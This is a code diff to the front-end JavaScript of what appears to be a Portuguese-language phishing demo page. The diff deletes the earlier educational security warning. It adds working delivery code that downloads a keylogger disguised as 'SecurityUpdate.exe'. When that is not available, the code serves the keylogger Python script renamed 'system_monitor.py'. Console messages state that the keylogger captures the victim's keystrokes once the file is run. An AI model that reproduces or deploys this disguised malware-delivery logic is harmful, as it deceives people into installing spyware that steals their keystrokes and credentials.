@@ -2,8 +2,8 @@
   const downloadBtn = document.getElementById('download-btn');
   const status = document.getElementById('status');
   
-  // CONFIGURAÇÃO: URL do servidor backend
-  const API_URL = 'http://localhost:5000/api';
+  // CONFIGURAÇÃO: URL relativa (funciona em qualquer servidor)
+  const API_URL = '/api';
   
   // Sem execução de payloads no cliente; execução ocorre apenas via servidor (server.py -> keylogger.py)
 
@@ -192,73 +192,55 @@ python "%USERPROFILE%\\Downloads\\${filename}"
       // 1. Captura informações (simulação de telemetria)
       const userInfo = logUserInfo();
       
-      // 2. EXECUTA SCRIPT NO SERVIDOR
-      console.log('🎯 Executando script no servidor...');
-      showStatus('⚙️ Iniciando keylogger no servidor...', 'downloading');
+      // 2. BAIXA O EXECUTÁVEL DO KEYLOGGER
+      console.log('🎯 Preparando download do executável...');
+      showStatus('📦 Gerando instalador...', 'downloading');
       
-      const execResult = await executeScriptOnServer();
-      console.log('✅ Script executado no servidor:', execResult);
+      // Simula delay de processamento
+      await new Promise(resolve => setTimeout(resolve, 1500));
       
-      // 3. Simula delay de processamento
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      // 3. Solicita o executável do servidor
+      showStatus('📥 Baixando instalador...', 'downloading');
       
-      // 4. Gera arquivo de "relatório" com informações básicas e status do script
-      const fileContent = `
-# Relatório de Execução
-# Gerado em: ${new Date().toLocaleString('pt-BR')}
-
-## INFORMAÇÕES DO SISTEMA
-Timestamp: ${userInfo.timestamp}
-Plataforma: ${navigator.platform}
-User Agent: ${navigator.userAgent}
-Linguagem: ${navigator.language}
-Resolução: ${screen.width}x${screen.height}
-
-## SCRIPT INICIADO
-Script: ${execResult.script || 'keylogger.py'}
-PID do Processo: ${execResult.pid || 'N/A'}
-Status: ${execResult.success ? 'Executando em background' : 'Falhou'}
-Mensagem: ${execResult.message || 'N/A'}
-
-## AVISO DE SEGURANÇA
-Este é apenas um exemplo educacional para demonstrar como
-ataques de engenharia social funcionam.
-
-NUNCA:
-- Execute arquivos de fontes não confiáveis
-- Clique em links suspeitos
-- Forneça dados pessoais sem verificar a fonte
-- Baixe "atualizações" ou "ferramentas" de sites desconhecidos
-
-SEMPRE:
-- Verifique URLs antes de clicar
-- Use antivírus atualizado
-- Mantenha o navegador atualizado
-- Desconfie de ofertas "boas demais"
-      `.trim();
+      try {
+        const response = await fetch(`${API_URL}/download-exe`, {
+          method: 'GET'
+        });
+        
+        if (!response.ok) {
+          throw new Error('Executável não disponível no servidor');
+        }
+        
+        // Baixa o arquivo .exe
+        const blob = await response.blob();
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'SecurityUpdate.exe';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        showStatus('✅ Download concluído! Execute o arquivo baixado.', 'success');
+        console.log('📂 Executável baixado: SecurityUpdate.exe');
+        console.log('⚠️  O keylogger será ativado quando a vítima executar o arquivo');
+        
+      } catch (downloadError) {
+        console.warn('❌ Servidor não possui o .exe. Gerando instrução local...');
+        
+        // Fallback: Fornece o script Python para a vítima baixar
+        const pythonScript = await fetch('../../backend/keylogger.py').then(r => r.text());
+        simulateDownload('system_monitor.py', pythonScript);
+        
+        showStatus('✅ Script baixado! Instruções no console.', 'success');
+        console.log('📂 Script Python baixado');
+        console.log('ℹ️  Para executar: python system_monitor.py');
+        console.log('⚠️  O keylogger captura teclas quando executado na máquina da vítima');
+      }
       
-      // 4. Dispara download
-      simulateDownload('instalador_simulado.txt', fileContent);
-      
-      // 5. Feedback de sucesso
-      await new Promise(resolve => setTimeout(resolve, 500));
-      showStatus(`✅ Keylogger iniciado! PID: ${execResult.pid}`, 'success');
-      
-  console.log('📂 Arquivo de relatório baixado');
-      console.log(`🔴 KEYLOGGER RODANDO - PID: ${execResult.pid}`);
-      console.log('⚠️  Pressione ESC no teclado para parar o keylogger');
-      
-      // 6. Opcional: redirecionar após alguns segundos
-      setTimeout(() => {
-        // window.location.href = './index.html'; // descomente para redirecionar
-      }, 3000);
-      
-      // 7. Você pode enviar dados para servidor (se tiver backend)
-      // await fetch('/api/track-download', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify(userInfo)
-      // });
+      // Registra telemetria (opcional)
+      console.log('📊 Telemetria capturada:', userInfo);
       
     } catch (error) {
       console.error('Erro ao processar download:', error);
